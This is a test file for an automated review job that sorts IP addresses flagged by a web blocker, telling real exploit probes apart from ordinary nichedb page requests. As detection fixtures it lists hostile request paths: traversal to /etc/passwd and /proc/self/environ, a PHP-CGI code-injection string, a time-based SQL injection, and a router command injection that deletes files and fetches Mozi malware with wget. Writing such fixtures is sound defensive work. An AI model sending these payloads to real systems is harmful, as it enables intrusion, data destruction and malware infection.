/**
 * riotcoder's /traffic review rules, from the real cases of the first review
 * (2026-10-18). What would be embarrassing: approving an ordinary nichedb page
 * because its URL contains "shell", "phpmyadmin" or "../" inside a query;
 * approving a Cloudflare address; publishing an operator who logged in; or
 * overwriting a person's decision made while the job ran.
 */
import { beforeEach, describe, expect, test } from 'bun:test';
import { migratedPglite, pgliteSql } from './helpers/pglite.js';

process.env.DATABASE_URL ??= 'postgres://test:test@localhost:5432/test';
process.env.SITE_URL ??= 'https://nichedb.test';

const { probesIn, reviewAddress } = await import('../packages/core/src/traffic/review.js');
const { isSharedIp } = await import('../packages/core/src/traffic/shared.js');
const store = await import('../packages/db/src/traffic.js');

const row = (ip, extra = {}) => ({
  ip,
  rules: ['attack-rce'],
  blocks: 1,
  servers: 1,
  paths: [],
  ...extra,
});

describe('probes', () => {
  test('real exploit probes are caught', () => {
    for (const p of [
      '/.env',
      '/.git/config',
      '/__vite_rsc_findSourceMapURL?filename=file:///proc/self/environ&environmentName=rsc',
      '/vendor/%2e%2e%2f%2e%2e%2fetc/passwd',
      '/static/..;/..;/proc/self/environ',
      '/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input',
      "/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z/crypto/ADA-USD",
      '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://x/Mozi.m',
      '/phpmyadmin/',
      '/api/geojson?url=file:///etc/shells',
    ])
      expect(probesIn([p])).toEqual([p]);
  });

  test('ordinary nichedb pages that tripped ThreatCrush rules are not probes', () => {
    for (const p of [
      '/c/mcp?tag=docker-compose',
      '/providers?has=cli&runtime=perl%2Cnode&category=dedicated',
      '/tlds/shell',
      '/ring/phpmyadmin-released/next',
      '/phpunit-expert-articles.json',
      '/telescoper-blog/read?p=http%3A%2F%2Ftelescoper.blog%2F%3Fp%3D90793',
      '/api/frame?u=https%3A%2F%2Fweb.archive.org%2Fweb%2F2016%2FJavascript%3A%2520x',
      '/alacarta/read?p=https%3A%2F%2Fprogramas.example.com%2Faudiorss%2F..%2Fmedia%2Fa.mp3',
      '/candidates?tags=TypeScript%2CPerl%2CGo',
    ])
      expect(probesIn([p])).toEqual([]);
  });
});

describe('reviewAddress', () => {
  test('a probe approves, with the probe as the reason', () => {
    const r = reviewAddress(row('35.214.117.74', { paths: ['/.env', '/.git/config'] }));
    expect(r.decision).toBe('approve');
    expect(r.note).toContain('/.env');
  });

  test('a Cloudflare address is rejected however bad it looks', () => {
    expect(isSharedIp('172.71.183.86')).toBe(true);
    expect(reviewAddress(row('172.71.183.86', { paths: ['/.env'] })).decision).toBe('reject');
  });

  test('anyone who logged in over SSH is an operator', () => {
    const r = reviewAddress(row('172.12.140.170', { paths: ['/.env'] }), { ssh_accepted: 2 });
    expect(r.decision).toBe('reject');
    expect(r.note).toContain('operator');
  });

  test('SSH brute force approves on failures or repeat bans, never with a login', () => {
    const brute = row('92.118.39.14', { rules: ['ssh-root-login'], blocks: 53, servers: 6 });
    expect(reviewAddress(brute).decision).toBe('approve');
    expect(
      reviewAddress(row('92.118.39.15', { rules: ['ssh-brute-force'] }), { ssh_failed: 9 })
        .decision,
    ).toBe('approve');
    expect(
      reviewAddress(row('92.118.39.16', { rules: ['ssh-brute-force'], blocks: 1 })).decision,
    ).toBe('pending');
  });

  test('plenty of ordinary requests and no probe means the ban was wrong', () => {
    const r = reviewAddress(row('17.166.22.207'), {
      n: 182,
      status: { 200: 141, 301: 22, 402: 16 },
      paths: ['/candidates?tags=REST%2CPerl', '/i/151620020'],
    });
    expect(r.decision).toBe('reject');
    expect(r.note).toContain('182 requests');
  });

  test('no evidence waits', () => {
    expect(reviewAddress(row('187.14.50.217', { rules: ['web-scanner-detection'] })).decision).toBe(
      'pending',
    );
    expect(reviewAddress(row('187.14.50.218'), { n: 3, paths: ['/i/1'] }).decision).toBe('pending');
  });
});

describe('store against PGlite', () => {
  let sql;
  beforeEach(async () => {
    sql = pgliteSql(await migratedPglite());
    const mk = (ip, paths) => ({
      ip,
      score: 50,
      category: 'exploit',
      first_seen: null,
      last_seen: '2026-10-17T00:00:00Z',
      blocks: 2,
      servers: 1,
      rules: ['attack-rce'],
      max_severity: 'high',
      evidence: { titles: [], paths },
    });
    await store.upsertCandidates(
      [mk('45.148.10.7', ['/.env']), mk('45.148.10.8', ['/i/1']), mk('45.148.10.9', [])],
      {
        db: sql,
      },
    );
  }, 30_000);

  test('the queue carries stored paths; decisions land as riotcoder and show publicly', async () => {
    const queue = await store.pendingForReview({}, { db: sql });
    expect(queue.find((r) => r.ip === '45.148.10.7').paths).toEqual(['/.env']);
    const decisions = queue.map((r) => ({ ip: r.ip, ...reviewAddress(r) }));
    expect(await store.applyReview(decisions, { db: sql })).toBe(1);
    const pub = await store.lookupIp('45.148.10.7', { db: sql });
    expect(pub.listed).toBe(true);
    expect(pub.reviewer).toBe('riotcoder');
    expect(pub.review_note).toContain('/.env');
  });

  test("a person's decision made meanwhile is never overwritten", async () => {
    const [{ id: userId }] =
      await sql`insert into users (email) values ('mod@nichedb.test') returning id`;
    await store.reviewIps(
      { ips: ['45.148.10.7'], status: 'rejected', userId, note: 'ours' },
      { db: sql },
    );
    expect(
      await store.applyReview([{ ip: '45.148.10.7', decision: 'approve', note: 'x' }], { db: sql }),
    ).toBe(0);
    const pub = await store.lookupIp('45.148.10.7', { db: sql });
    expect(pub.listed).toBe(false);
  });
});
